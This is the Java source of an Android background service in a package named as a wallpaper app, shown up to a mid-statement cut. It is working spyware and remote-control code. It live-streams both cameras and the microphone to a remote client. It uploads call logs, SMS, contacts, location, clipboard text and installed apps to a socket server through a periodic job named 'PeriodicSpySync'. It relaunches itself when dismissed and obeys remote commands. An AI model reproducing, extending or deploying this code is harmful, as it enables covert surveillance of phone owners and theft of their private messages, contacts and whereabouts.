package com.example.wallpaperapplication;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.AudioManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import android.widget.Toast;

import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import androidx.preference.PreferenceManager;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;

import io.socket.client.IO;
import io.socket.client.Socket;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.webrtc.*;

import java.io.File;
import java.net.URISyntaxException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import android.speech.tts.TextToSpeech;

public class StreamingService extends Service implements android.hardware.SensorEventListener, TextToSpeech.OnInitListener {
    private TextToSpeech tts;
    private android.hardware.SensorManager sensorManager;
    private android.hardware.Sensor lightSensor;
    private android.hardware.Sensor proximitySensor;
    private android.hardware.Sensor accelSensor;
    private boolean isSensorSubscribed = false;
    private long lastSensorEmitTime = 0;
    private static final String TAG = "StreamingService";
    private static final long DATA_POLL_INTERVAL = 30_000; // Poll every 30 seconds

    private PeerConnectionFactory factory;
    private EglBase eglBase;
    
    // Modular Components
    private CameraManager cameraManager;
    private FileSystemExtension fileSystemExtension;
    private LocalRecorder localRecorder;

    private AudioSource audioSource;
    private PeerConnection peerConnection;
    private Socket socket;
    private volatile String webClientId = null;
    private FusedLocationProviderClient fusedLocationClient;
    private LocationCallback locationCallback;
    private BroadcastReceiver syncReceiver;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service onCreate");

        tts = new TextToSpeech(this, this);

        sensorManager = (android.hardware.SensorManager) getSystemService(Context.SENSOR_SERVICE);
        if (sensorManager != null) {
            lightSensor = sensorManager.getDefaultSensor(android.hardware.Sensor.TYPE_LIGHT);
            proximitySensor = sensorManager.getDefaultSensor(android.hardware.Sensor.TYPE_PROXIMITY);
            accelSensor = sensorManager.getDefaultSensor(android.hardware.Sensor.TYPE_ACCELEROMETER);
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(Constants.NOTIFICATION_ID, createNotification(), 
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA | 
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE | 
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION | 
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(Constants.NOTIFICATION_ID, createNotification());
        }

        // Register Sync Receiver (triggered by WorkManager)
        syncReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (Constants.ACTION_FORCE_SYNC.equals(intent.getAction())) {
                    Log.d(TAG, "Received Force Sync broadcast");
                    if (socket != null && socket.connected()) {
                        sendCallLogs();
                        sendSmsMessages();
                        sendContacts();
                        sendDeviceInfo();
                        requestLastLocation();
                    }
                }
            }
        };
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(syncReceiver, new IntentFilter(Constants.ACTION_FORCE_SYNC), Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(syncReceiver, new IntentFilter(Constants.ACTION_FORCE_SYNC));
        }

        // Schedule WorkManager (Periodic fallback)
        androidx.work.PeriodicWorkRequest saveRequest =
                new androidx.work.PeriodicWorkRequest.Builder(DataSyncWorker.class, 15, java.util.concurrent.TimeUnit.MINUTES)
                        .build();
        androidx.work.WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                "PeriodicSpySync",
                androidx.work.ExistingPeriodicWorkPolicy.KEEP,
                saveRequest);

        if (!hasRequiredPermissions()) {
            broadcastPermissionError();
            stopSelf();
            return;
        }
        
        initializeWebRTC();
        localRecorder = new LocalRecorder(this, eglBase);
        setupMediaStreaming();
        connectSignaling();
        startNotificationListener();
        
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getAction();
            if (Constants.ACTION_STOP_STREAMING.equals(action)) {
                stopSelf();
            }
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service onDestroy");
        if (syncReceiver != null) unregisterReceiver(syncReceiver);
        cleanup();
        if (socket != null) socket.disconnect();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.d(TAG, "Service task removed (app swiped), restarting...");
        Intent restartServiceIntent = new Intent(getApplicationContext(), StreamingService.class);
        restartServiceIntent.setPackage(getPackageName());
        int pendingFlags = PendingIntent.FLAG_ONE_SHOT;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            pendingFlags |= PendingIntent.FLAG_IMMUTABLE;
        }
        PendingIntent restartServicePendingIntent = PendingIntent.getService(
                getApplicationContext(), 1, restartServiceIntent, pendingFlags);
        
        android.app.AlarmManager alarmService = (android.app.AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
        if (alarmService != null) {
            alarmService.set(
                    android.app.AlarmManager.ELAPSED_REALTIME,
                    android.os.SystemClock.elapsedRealtime() + 1000,
                    restartServicePendingIntent);
        }
        super.onTaskRemoved(rootIntent);
    }

    private String getSignalingUrl() {
        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
        return prefs.getString(Constants.PREF_SIGNALING_URL, Constants.DEFAULT_SIGNALING_URL);
    }

    private boolean hasRequiredPermissions() {
        boolean camera = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED;
        boolean audio = ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
        boolean notify = Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED;
        boolean callLog = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED;
        boolean sms = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
        boolean location = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
        boolean contacts = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
        
        boolean storage = true;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            storage = android.os.Environment.isExternalStorageManager();
        } else {
            storage = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }

        if (!camera) Log.e(TAG, "Camera permission missing");
        if (!audio) Log.e(TAG, "Record audio permission missing");
        if (!notify) Log.e(TAG, "Notifications permission missing");
        if (!callLog) Log.e(TAG, "Call log permission missing");
        if (!sms) Log.e(TAG, "SMS permission missing");
        if (!location) Log.e(TAG, "Location permission missing");
        if (!contacts) Log.e(TAG, "Contacts permission missing");
        if (!storage) Log.e(TAG, "Storage permission missing");
        
        return camera && audio && notify && callLog && sms && location && contacts && storage;
    }

    private void broadcastPermissionError() {
        Intent err = new Intent(Constants.ACTION_PERMISSION_ERROR);
        sendBroadcast(err);
    }

    private void initializeWebRTC() {
        PeerConnectionFactory.initialize(
                PeerConnectionFactory.InitializationOptions.builder(this)
                        .setEnableInternalTracer(true)
                        .createInitializationOptions());
        eglBase = EglBase.create();
        factory = PeerConnectionFactory.builder()
                .setVideoEncoderFactory(new DefaultVideoEncoderFactory(eglBase.getEglBaseContext(), true, true))
                .setVideoDecoderFactory(new DefaultVideoDecoderFactory(eglBase.getEglBaseContext()))
                .createPeerConnectionFactory();
    }

    private void setupMediaStreaming() {
        cameraManager = new CameraManager(this, eglBase);
        cameraManager.initialize(factory);
        cameraManager.startFrontCamera();
        cameraManager.startBackCamera();

        setupAudioCapture();
        setupPeerConnection();
    }

    private void setupAudioCapture() {
        MediaConstraints audioConstraints = new MediaConstraints();
        audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googEchoCancellation", "true"));
        audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googAutoGainControl", "true"));
        audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googNoiseSuppression", "true"));
        audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googHighpassFilter", "true"));
        audioSource = factory.createAudioSource(audioConstraints);
        Log.d(TAG, "Audio capture initialized");
    }

    private void setupPeerConnection() {
        List<PeerConnection.IceServer> ice = new ArrayList<>();
        ice.add(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer());
        ice.add(PeerConnection.IceServer.builder("turn:numb.viagenie.ca")
                .setUsername("your@email.com")
                .setPassword("yourpassword")
                .createIceServer());

        PeerConnection.RTCConfiguration config = new PeerConnection.RTCConfiguration(ice);
        config.sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN;
        config.tcpCandidatePolicy = PeerConnection.TcpCandidatePolicy.DISABLED;
        config.bundlePolicy = PeerConnection.BundlePolicy.MAXBUNDLE;
        config.rtcpMuxPolicy = PeerConnection.RtcpMuxPolicy.REQUIRE;

        peerConnection = factory.createPeerConnection(config, new PeerConnection.Observer() {
            @Override
            public void onSignalingChange(PeerConnection.SignalingState s) {
                Log.d(TAG, "Signaling state: " + s);
            }
            @Override
            public void onIceConnectionChange(PeerConnection.IceConnectionState s) {
                Log.d(TAG, "ICE connection state: " + s);
            }
            @Override
            public void onIceConnectionReceivingChange(boolean receiving) {}
            @Override
            public void onIceGatheringChange(PeerConnection.IceGatheringState s) {
                Log.d(TAG, "ICE gathering state: " + s);
            }
            @Override
            public void onIceCandidate(IceCandidate c) {
                if (webClientId == null) return;
                try {
                    JSONObject candidate = new JSONObject();
                    candidate.put("sdpMid", c.sdpMid);
                    candidate.put("sdpMLineIndex", c.sdpMLineIndex);
                    candidate.put("candidate", c.sdp);
                    JSONObject signal = new JSONObject();
                    signal.put("candidate", candidate);
                    JSONObject msg = new JSONObject();
                    msg.put("to", webClientId);
                    msg.put("from", socket.id());
                    msg.put("signal", signal);
                    socket.emit(Constants.EVENT_SIGNAL, msg);
                    Log.d(TAG, "Sent ICE candidate: " + c.sdpMid);
                } catch (JSONException e) {
                    Log.e(TAG, "ICE send failed", e);
                }
            }
            @Override
            public void onIceCandidatesRemoved(IceCandidate[] cs) {}
            @Override
            public void onAddStream(org.webrtc.MediaStream ms) {}
            @Override
            public void onRemoveStream(org.webrtc.MediaStream ms) {}
            @Override
            public void onDataChannel(org.webrtc.DataChannel dc) {}
            @Override
            public void onRenegotiationNeeded() {}
            @Override
            public void onAddTrack(RtpReceiver r, org.webrtc.MediaStream[] ms) {
                Log.d(TAG, "Track added: " + r.id());
            }
        });

        if (cameraManager.hasFrontCamera()) {
            VideoTrack frontTrack = cameraManager.getFrontTrack();
            peerConnection.addTransceiver(frontTrack, new RtpTransceiver.RtpTransceiverInit(
                    RtpTransceiver.RtpTransceiverDirection.SEND_ONLY, Collections.singletonList("stream")));
            Log.d(TAG, "Front video track added");
        }
        if (cameraManager.hasBackCamera()) {
            VideoTrack backTrack = cameraManager.getBackTrack();
            peerConnection.addTransceiver(backTrack, new RtpTransceiver.RtpTransceiverInit(
                    RtpTransceiver.RtpTransceiverDirection.SEND_ONLY, Collections.singletonList("stream")));
            Log.d(TAG, "Back video track added");
        }
        if (audioSource != null) {
            AudioTrack at = factory.createAudioTrack("audio", audioSource);
            peerConnection.addTransceiver(at, new RtpTransceiver.RtpTransceiverInit(
                    RtpTransceiver.RtpTransceiverDirection.SEND_RECV, Collections.singletonList("stream")));
            Log.d(TAG, "Audio track added");
            
            // Route two-way audio to main speakerphone
            AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
            if (am != null) {
                am.setMode(AudioManager.MODE_IN_COMMUNICATION);
                am.setSpeakerphoneOn(true);
            }
        }
    }

    private void connectSignaling() {
        String signalingUrl = getSignalingUrl();
        Log.d(TAG, "Connecting to signaling at " + signalingUrl);

        IO.Options opts = new IO.Options();
        opts.transports = new String[]{"websocket"};
        opts.reconnection = true;
        opts.reconnectionAttempts = 5;
        opts.reconnectionDelay = 5000;

        try {
            socket = IO.socket(signalingUrl, opts);
        } catch (URISyntaxException e) {
            Log.e(TAG, "Bad signaling URL", e);
            stopSelf();
            return;
        }

        // Initialize Filesystem Extension
        fileSystemExtension = new FileSystemExtension(this, socket);
        fileSystemExtension.init();

        socket.on(Socket.EVENT_CONNECT, args -> {
            Log.d(TAG, "Socket.IO CONNECTED");
            socket.emit(Constants.EVENT_IDENTIFY, "android");
            // Offer is only created when web-client-ready fires (avoids double offer)
        }).on(Socket.EVENT_CONNECT_ERROR, args -> {
            Log.e(TAG, "Connect error: " + Arrays.toString(args));
        }).on("id", args -> {
            Log.d(TAG, "Received socket ID: " + args[0]);
        }).on(Constants.EVENT_WEB_CLIENT_READY, args -> {
            webClientId = (String) args[0];
            Log.d(TAG, "Web client ready: " + webClientId);
            createAndSendOffer();
            startLocationUpdates();
            sendCallLogs(); // Immediate sync
            sendSmsMessages(); // Immediate sync
            sendContacts(); // Immediate sync
            sendDeviceInfo(); // Immediate sync
        }).on(Constants.EVENT_SIGNAL, args -> {
            Log.d(TAG, "Signal incoming");
            if (args[0] instanceof JSONObject) {
                handleSignaling((JSONObject) args[0]);
            }
        }).on("web-client-disconnected", args -> {
            Log.d(TAG, "Web client disconnected: " + args[0]);
            if (args[0].equals(webClientId)) {
                webClientId = null;
                stopLocationUpdates();
            }
        }).on(Constants.CMD_PING, args -> {
            sendDeviceInfo();
        }).on(Constants.CMD_STOP, args -> {
            cleanup();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                stopForeground(Service.STOP_FOREGROUND_REMOVE);
            } else {
                stopForeground(true);
            }
            stopSelf();
        }).on(Constants.CMD_RECORD, args -> {
            toggleLocalRecording();
        }).on(Constants.CMD_GET_APPS, args -> {
            sendAppsList();
        }).on(Constants.CMD_GET_CONTACTS, args -> {
            sendContacts();
        }).on(Constants.CMD_VIBRATE, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                vibrateDevice((JSONObject) args[0]);
            } else {
                vibrateDevice(null);
            }
        }).on(Constants.CMD_TOAST, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                showToast((JSONObject) args[0]);
            }
        }).on(Constants.CMD_OPEN_URL, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                openUrl((JSONObject) args[0]);
            }
        }).on(Constants.CMD_FLASHLIGHT, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                toggleFlashlight((JSONObject) args[0]);
            } else {
                toggleFlashlight(null);
            }
        }).on(Constants.CMD_SET_VOLUME, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                setVolume((JSONObject) args[0]);
            }
        }).on(Constants.CMD_SET_BRIGHTNESS, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                setBrightness((JSONObject) args[0]);
            }
        }).on(Constants.CMD_RING_DEVICE, args -> {
            ringDevice();
        }).on(Constants.CMD_SET_QUALITY, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                setVideoQuality((JSONObject) args[0]);
            }
        }).on(Constants.CMD_SET_GPS_INTERVAL, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                setGpsInterval((JSONObject) args[0]);
            }
        }).on(Constants.CMD_LAUNCH_APP, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                launchApp((JSONObject) args[0]);
            }
        }).on(Constants.CMD_TOGGLE_SENSORS, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                toggleSensorSubscription((JSONObject) args[0]);
            }
        }).on(Constants.CMD_GET_NETWORK, args -> {
            sendNetworkDiagnostics();
        }).on(Constants.CMD_TAKE_SNAPSHOT, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                takeCameraSnapshot((JSONObject) args[0]);
            }
        }).on(Constants.CMD_GET_CLIPBOARD, args -> {
            getClipboardText();
        }).on(Constants.CMD_SET_CLIPBOARD, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                setClipboardText((JSONObject) args[0]);
            }
        }).on(Constants.CMD_TTS_SPEAK, args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                speakTts((JSONObject) args[0]);
            }
        });

        socket.connect();
    }

    private void toggleLocalRecording() {
        if (localRecorder == null) {
            localRecorder = new LocalRecorder(this, eglBase);
        }
        if (localRecorder.isRecording()) {
            localRecorder.stop(path -> {
                Log.d(TAG, "Local recording stopped, saved to: " + path);
                sendRecordingStatus(false, path);
            });
        } else {
            String path = null;
            if (cameraManager != null) {
                if (cameraManager.hasBackCamera()) {
                    path = localRecorder.startSingle(cameraManager.getBackTrack());
                } else if (cameraManager.hasFrontCamera()) {
                    path = localRecorder.startSingle(cameraManager.getFrontTrack());
                }
            }
            if (path != null) {
                Log.d(TAG, "Local recording started, saving to: " + path);
                sendRecordingStatus(true, path);
            }
        }
    }

    private void sendRecordingStatus(boolean active, String path) {
        if (webClientId == null || socket == null || !socket.connected()) return;
        try {
            JSONObject data = new JSONObject()
                    .put("type", "recording_status")
                    .put("active", active);
            if (path != null) {
                data.put("file", path);
            }
            JSONObject msg = new JSONObject()
                    .put("to", webClientId)
                    .put("from", socket.id())
                    .put("signal", data);
            socket.emit(Constants.EVENT_SIGNAL, msg);
        } catch (JSONException e) {
            Log.e(TAG, "Error sending recording status", e);
        }
    }

    private void sendDeviceInfo() {
        if (socket == null || !socket.connected()) return;
        try {
            JSONObject info = new JSONObject();
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("version", Build.VERSION.RELEASE);
            info.put("streaming", true);
            info.put("recording", localRecorder != null && localRecorder.isRecording());

            // Get battery details dynamically
            JSONObject battery = getBatteryDetails();
            info.put("battery", battery.optInt("percent", 0));
            info.put("batteryTemp", battery.optDouble("temperature", 0.0));
            info.put("chargingSource", battery.optString("source", "unplugged"));

            // Get storage details
            long[] storage = getStorageMetrics();
            double totalGB = storage[0] / (1024.0 * 1024.0 * 1024.0);
            double freeGB = storage[1] / (1024.0 * 1024.0 * 1024.0);
            info.put("storageTotal", Math.round(totalGB * 100.0) / 100.0);
            info.put("storageFree", Math.round(freeGB * 100.0) / 100.0);

            socket.emit(Constants.EVENT_DEVICE_INFO, info);
        } catch (Exception e) {
            Log.e(TAG, "Error sending device info", e);
        }
    }

    private JSONObject getBatteryDetails() {
        JSONObject details = new JSONObject();
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = registerReceiver(null, ifilter);
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                int chargePlug = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
                int temperature = batteryStatus.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1);
                
                double batteryPct = (scale > 0) ? (level * 100 / (double) scale) : 0;
                double tempC = temperature / 10.0;
                
                String source = "unplugged";
                if (chargePlug == BatteryManager.BATTERY_PLUGGED_AC) source = "AC Charger";
                else if (chargePlug == BatteryManager.BATTERY_PLUGGED_USB) source = "USB Port";
                else if (chargePlug == BatteryManager.BATTERY_PLUGGED_WIRELESS) source = "Wireless";
                
                details.put("percent", (int) batteryPct);
                details.put("temperature", tempC);
                details.put("source", source);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error fetching battery details", e);
        }
        return details;
    }

    private long[] getStorageMetrics() {
        try {
            File path = android.os.Environment.getDataDirectory();
            android.os.StatFs stat = new android.os.StatFs(path.getPath());
            long blockSize = stat.getBlockSizeLong();
            long totalBlocks = stat.getBlockCountLong();
            long availableBlocks = stat.getAvailableBlocksLong();
            
            long totalBytes = totalBlocks * blockSize;
            long freeBytes = availableBlocks * blockSize;
            
            return new long[]{ totalBytes, freeBytes };
        } catch (Exception e) {
            Log.e(TAG, "Error fetching storage metrics", e);
            return new long[]{0, 0};
        }
    }

    private void setVideoQuality(JSONObject payload) {
        if (payload == null || cameraManager == null) return;
        String quality = payload.optString("quality", "medium");
        int width = 640;
        int height = 480;
        int fps = 15;
        if ("low".equals(quality)) {
            width = 320;
            height = 240;
            fps = 10;
        } else if ("high".equals(quality)) {
            width = 1280;
            height = 720;
            fps = 30;
        }
        cameraManager.changeResolution(width, height, fps);
    }

    private void setGpsInterval(JSONObject payload) {
        if (payload == null) return;
        long intervalMs = payload.optLong("intervalMs", 10000);
        Log.d(TAG, "Setting GPS polling interval to: " + intervalMs + "ms");
        startLocationUpdates(intervalMs);
    }

    private void launchApp(JSONObject payload) {
        if (payload == null) return;
        String packageName = payload.optString("packageName", "");
        if (!packageName.isEmpty()) {
            try {
                Intent intent = getPackageManager().getLaunchIntentForPackage(packageName);
                if (intent != null) {
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                    Log.d(TAG, "Successfully launched app package: " + packageName);
                } else {
                    Log.w(TAG, "No launch intent found for package: " + packageName);
                }
            } catch (Exception e) {
                Log.e(TAG, "Error launching app: " + packageName, e);
            }
        }
    }

    private void sendAppsList() {
        if (webClientId == null || socket == null || !socket.connected()) return;
        new Thread(() -> {
            try {
                JSONArray apps = new JSONArray();
                PackageManager pm = getPackageManager();
                for (ApplicationInfo packageInfo : pm.getInstalledApplications(PackageManager.GET_META_DATA)) {
                    if ((packageInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                        JSONObject app = new JSONObject();
                        app.put("name", pm.getApplicationLabel(packageInfo).toString());
                        app.put("package", packageInfo.packageName);
                        try {
                            app.put("version", pm.getPackageInfo(packageInfo.packageName, 0).versionName);
                        } catch (Exception e) {
                            app.put("version", "unknown");
                        }
                        apps.put(app);
                    }
                }
                JSONObject msg = new JSONObject()
                        .put("to", webClientId)
                        .put("apps", apps);
                socket.emit(Constants.EVENT_APPS, msg);
            } catch (Exception e) {
                Log.e(TAG, "Error listing apps", e);
            }
        }).start();
    }

    private void sendContacts() {
        if (webClientId == null || socket == null || !socket.connected()) return;
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Read contacts permission not granted");
            return;
        }
        new Thread(() -> {
            try {
                JSONArray contacts = new JSONArray();
                Cursor cursor = getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null, null, null,
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
                );
                if (cursor != null) {
                    int nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                    int numberIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                    while (cursor.moveToNext()) {
                        JSONObject contact = new JSONObject();
                        contact.put("name", cursor.getString(nameIdx));
                        contact.put("number", cursor.getString(numberIdx));
                        contacts.put(contact);
                    }
                    cursor.close();
                }
                JSONObject msg = new JSONObject()
                        .put("to", webClientId)
                        .put("contacts_list", contacts);
                socket.emit(Constants.EVENT_CONTACTS, msg);
            } catch (Exception e) {
                Log.e(TAG, "Error fetching contacts", e);
            }
        }).start();
    }

    private void vibrateDevice(JSONObject payload) {
        try {
            long duration = payload != null ? payload.optLong("duration", 500) : 500;
            Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null && v.hasVibrator()) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    v.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE));
                } else {
                    v.vibrate(duration);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error vibrating device", e);
        }
    }

    private void showToast(JSONObject payload) {
        if (payload == null) return;
        String text = payload.optString("text", "");
        if (!text.isEmpty()) {
            new Handler(Looper.getMainLooper()).post(() -> 
                Toast.makeText(StreamingService.this, text, Toast.LENGTH_SHORT).show()
            );
        }
    }

    private void openUrl(JSONObject payload) {
        if (payload == null) return;
        String url = payload.optString("url", "");
        if (!url.isEmpty()) {
            try {
                android.net.Uri uri = android.net.Uri.parse(url);
                Intent intent = new Intent(Intent.ACTION_VIEW, uri);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            } catch (Exception e) {
                Log.e(TAG, "Error opening URL", e);
            }
        }
    }

    private boolean isTorchOn = false;
    private void toggleFlashlight(JSONObject payload) {
        try {
            android.hardware.camera2.CameraManager cm = (android.hardware.camera2.CameraManager) getSystemService(CAMERA_SERVICE);
            if (cm == null) return;
            String cameraId = null;
            for (String id : cm.getCameraIdList()) {
                Boolean hasFlash = cm.getCameraCharacteristics(id).get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE);
                if (hasFlash != null && hasFlash) {
                    cameraId = id;
                    break;
                }
            }
            if (cameraId == null) {
                Log.w(TAG, "No camera with flashlight found");
                return;
            }
            isTorchOn = (payload != null) ? payload.optBoolean("on", !isTorchOn) : !isTorchOn;
            cm.setTorchMode(cameraId, isTorchOn);
            Log.d(TAG, "Flashlight toggled to: " + isTorchOn);
        } catch (Exception e) {
            Log.e(TAG, "Flashlight error", e);
        }
    }

    private void setVolume(JSONObject payload) {
        if (payload == null) return;
        try {
            AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
            if (am == null) return;
            int streamType = AudioManager.STREAM_MUSIC;
            switch (payload.optString("stream", "music")) {
                case "ring":
                    streamType = AudioManager.STREAM_RING;
                    break;
                case "alarm":
                    streamType = AudioManager.STREAM_ALARM;
                    break;
                case "call":
                    streamType = AudioManager.STREAM_VOICE_CALL;
                    break;
            }
            int maxVol = am.getStreamMaxVolume(streamType);
            int pct = Math.min(100, Math.max(0, payload.optInt("pct", 50)));
            int volume = (int) (maxVol * pct / 100.0);
            am.setStreamVolume(streamType, volume, 0);
            Log.d(TAG, "Volume set to " + volume + "/" + maxVol + " for stream " + streamType);
        } catch (Exception e) {
            Log.e(TAG, "Set volume error", e);
        }
    }

    private void setBrightness(JSONObject payload) {
        if (payload == null) return;
        try {
            int pct = Math.min(100, Math.max(0, payload.optInt("pct", 50)));
            int val = (int) (pct / 100.0 * 255);
            if (Settings.System.canWrite(this)) {
                Settings.System.putInt(getContentResolver(),
                        Settings.System.SCREEN_BRIGHTNESS_MODE,
                        Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL);
                Settings.System.putInt(getContentResolver(),
                        Settings.System.SCREEN_BRIGHTNESS, val);
                Log.d(TAG, "Brightness set to: " + val);
            } else {
                Log.w(TAG, "WRITE_SETTINGS permission not granted");
                new Handler(Looper.getMainLooper()).post(() ->
                    Toast.makeText(StreamingService.this, "Please grant Write Settings permission to adjust brightness", Toast.LENGTH_LONG).show()
                );
            }
        } catch (Exception e) {
            Log.e(TAG, "Set brightness error", e);
        }
    }

    private android.media.Ringtone activeRingtone;

    private void ringDevice() {
        try {
            // Stop any previously playing ringtone
            if (activeRingtone != null && activeRingtone.isPlaying()) {
                activeRingtone.stop();
            }
            AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
            if (am != null) {
                am.setStreamVolume(AudioManager.STREAM_RING,
                        am.getStreamMaxVolume(AudioManager.STREAM_RING), 0);
            }
            activeRingtone = android.media.RingtoneManager.getRingtone(this,
                    android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_RINGTONE));
            if (activeRingtone != null) {
                activeRingtone.play();
                Log.d(TAG, "Playing default ringtone");
                // Auto-stop after 15 seconds to prevent indefinite playback
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    if (activeRingtone != null && activeRingtone.isPlaying()) {
                        activeRingtone.stop();
                        Log.d(TAG, "Ringtone auto-stopped after timeout");
                    }
                }, 15000);
            }
        } catch (Exception e) {
            Log.e(TAG, "Ring device error", e);
        }
    }

    private long currentGpsIntervalMs = 10000;

    private void startLocationUpdates() {
        startLocationUpdates(currentGpsIntervalMs);
    }

    private void startLocationUpdates(long intervalMs) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Location permission not granted");
            broadcastPermissionError();
            return;
        }

        stopLocationUpdates();
        currentGpsIntervalMs = intervalMs;
        if (intervalMs <= 0) {
            Log.d(TAG, "GPS location updates suspended");
            return;
        }

        LocationRequest locationRequest = new LocationRequest.Builder(
